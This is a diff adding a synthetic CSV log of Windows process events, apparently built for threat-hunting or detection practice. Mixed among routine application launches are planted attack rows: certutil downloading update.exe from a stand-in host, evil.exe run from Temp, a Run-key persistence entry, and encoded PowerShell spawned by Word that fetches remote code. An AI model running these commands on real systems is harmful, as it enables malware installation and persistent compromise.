@@ -1,0 +1,1201 @@
+timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
+2026-04-01 08:00:00,eng-ws-02,alice,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 08:01:00,fin-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
+2026-04-01 08:02:00,sales-lt-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 08:03:00,eng-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 08:04:00,sales-lt-02,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 08:05:00,sales-lt-02,george,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 08:06:00,shared-jump-01,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",10.0.0.5,445,none
+2026-04-01 08:07:00,fin-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",52.95.110.1,443,outlook
+2026-04-01 08:08:00,fin-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",172.16.4.25,445,none
+2026-04-01 08:09:00,eng-ws-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 08:10:00,ops-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 08:11:00,eng-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-01 08:12:00,ops-ws-02,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 08:13:00,shared-jump-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 08:14:00,eng-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 08:15:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 08:16:00,ops-ws-02,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 08:17:00,fin-ws-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",45.33.32.156,443,outlook
+2026-04-01 08:18:00,hr-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
+2026-04-01 08:19:00,sales-lt-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 08:20:00,hr-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 08:21:00,eng-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 08:22:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 08:23:00,fin-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 08:24:00,fin-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 08:25:00,sales-lt-02,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 08:26:00,shared-jump-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",45.33.32.156,443,outlook
+2026-04-01 08:27:00,fin-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 08:28:00,eng-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 08:29:00,ops-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 08:30:00,shared-jump-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 08:31:00,sales-lt-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 08:32:00,sales-lt-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.4.25,445,none
+2026-04-01 08:33:00,eng-ws-02,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 08:34:00,sales-lt-01,alice,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 08:35:00,sales-lt-02,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-01 08:36:00,hr-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 08:37:00,fin-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.1.15,445,none
+2026-04-01 08:38:00,sales-lt-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 08:39:00,eng-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
+2026-04-01 08:40:00,fin-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 08:41:00,eng-ws-02,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 08:42:00,fin-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 08:43:00,hr-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 08:44:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
+2026-04-01 08:45:00,hr-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 08:45:00,hr-ws-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 08:46:00,sales-lt-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 08:46:00,hr-ws-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
+2026-04-01 08:47:00,fin-ws-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 08:47:00,hr-ws-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.10.9,0,none
+2026-04-01 08:48:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 08:49:00,eng-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 08:50:00,fin-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 08:51:00,sales-lt-02,diana,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 08:52:00,fin-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-01 08:53:00,sales-lt-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 08:54:00,eng-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",142.250.183.14,443,outlook
+2026-04-01 08:55:00,ops-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 08:56:00,eng-ws-02,alice,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 08:57:00,eng-ws-02,diana,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 08:58:00,sales-lt-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 08:59:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 09:00:00,sales-lt-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 09:01:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 09:02:00,ops-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 09:03:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 09:04:00,ops-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",192.168.1.12,445,none
+2026-04-01 09:05:00,hr-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 09:06:00,sales-lt-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 09:07:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 09:08:00,eng-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 09:09:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 09:10:00,eng-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 09:11:00,shared-jump-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 09:12:00,ops-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 09:13:00,shared-jump-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 09:14:00,shared-jump-01,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 09:15:00,hr-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 09:16:00,fin-ws-02,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 09:17:00,hr-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",1.1.1.1,443,outlook
+2026-04-01 09:18:00,eng-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 09:19:00,eng-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 09:20:00,hr-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",1.1.1.1,443,outlook
+2026-04-01 09:21:00,fin-ws-02,farah,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 09:22:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 09:23:00,shared-jump-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 09:24:00,eng-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 09:25:00,eng-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 09:26:00,shared-jump-01,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 09:27:00,fin-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
+2026-04-01 09:28:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 09:29:00,eng-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",23.45.67.89,443,outlook
+2026-04-01 09:30:00,hr-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 09:31:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 09:31:00,fin-ws-01,farah,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 09:32:00,eng-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 09:32:00,fin-ws-01,farah,evil.exe,explorer.exe,C:\Users\farah\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
+2026-04-01 09:33:00,sales-lt-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
+2026-04-01 09:33:00,fin-ws-01,farah,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
+2026-04-01 09:34:00,fin-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 09:35:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
+2026-04-01 09:36:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",185.199.108.153,443,outlook
+2026-04-01 09:37:00,ops-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 09:38:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.1.15,445,none
+2026-04-01 09:39:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 09:40:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 09:41:00,eng-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 09:42:00,sales-lt-01,farah,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 09:43:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 09:44:00,ops-ws-02,farah,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 09:45:00,hr-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 09:46:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",8.8.8.8,443,outlook
+2026-04-01 09:47:00,eng-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 09:48:00,eng-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 09:49:00,ops-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 09:50:00,eng-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 09:51:00,hr-ws-01,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 09:52:00,eng-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",192.168.10.9,445,none
+2026-04-01 09:53:00,fin-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 09:54:00,ops-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",1.1.1.1,443,outlook
+2026-04-01 09:55:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 09:56:00,ops-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 09:57:00,sales-lt-02,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 09:58:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 09:59:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 10:00:00,fin-ws-02,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.4.25,445,none
+2026-04-01 10:01:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 10:02:00,sales-lt-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.1.15,445,none
+2026-04-01 10:03:00,eng-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 10:04:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 10:05:00,fin-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 10:06:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 10:07:00,sales-lt-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 10:08:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
+2026-04-01 10:08:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-01 10:09:00,fin-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.10,445,none
+2026-04-01 10:09:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-01 10:10:00,ops-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 10:10:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-01 10:11:00,eng-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 10:12:00,sales-lt-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
+2026-04-01 10:13:00,sales-lt-02,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
+2026-04-01 10:14:00,sales-lt-01,julia,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 10:15:00,ops-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
+2026-04-01 10:16:00,sales-lt-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 10:17:00,hr-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 10:18:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 10:19:00,hr-ws-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",185.199.108.153,443,outlook
+2026-04-01 10:20:00,eng-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 10:21:00,fin-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 10:22:00,ops-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 10:23:00,eng-ws-01,diana,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 10:24:00,shared-jump-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
+2026-04-01 10:25:00,sales-lt-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
+2026-04-01 10:26:00,ops-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 10:27:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 10:28:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 10:29:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 10:30:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 10:31:00,ops-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 10:32:00,eng-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-01 10:33:00,eng-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 10:34:00,fin-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",104.18.20.12,443,outlook
+2026-04-01 10:35:00,ops-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
+2026-04-01 10:36:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 10:37:00,sales-lt-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
+2026-04-01 10:38:00,eng-ws-02,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.5,445,none
+2026-04-01 10:39:00,fin-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 10:40:00,fin-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 10:41:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 10:41:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-01 10:42:00,ops-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 10:42:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-01 10:43:00,fin-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 10:43:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-01 10:44:00,shared-jump-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
+2026-04-01 10:45:00,eng-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 10:46:00,eng-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 10:47:00,shared-jump-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
+2026-04-01 10:48:00,ops-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 10:49:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 10:50:00,eng-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",151.101.1.69,443,outlook
+2026-04-01 10:51:00,fin-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 10:52:00,hr-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.10.9,445,none
+2026-04-01 10:53:00,sales-lt-01,helen,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 10:54:00,ops-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 10:55:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 10:56:00,ops-ws-01,alice,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 10:57:00,fin-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 10:58:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 10:59:00,sales-lt-02,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
+2026-04-01 11:00:00,eng-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 11:01:00,sales-lt-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
+2026-04-01 11:02:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 11:03:00,eng-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 11:04:00,fin-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 11:05:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 11:06:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",104.18.20.12,443,outlook
+2026-04-01 11:07:00,sales-lt-01,ethan,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 11:08:00,fin-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 11:09:00,ops-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 11:10:00,fin-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 11:11:00,hr-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.10.9,445,none
+2026-04-01 11:12:00,shared-jump-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 11:13:00,fin-ws-02,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 11:14:00,sales-lt-02,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
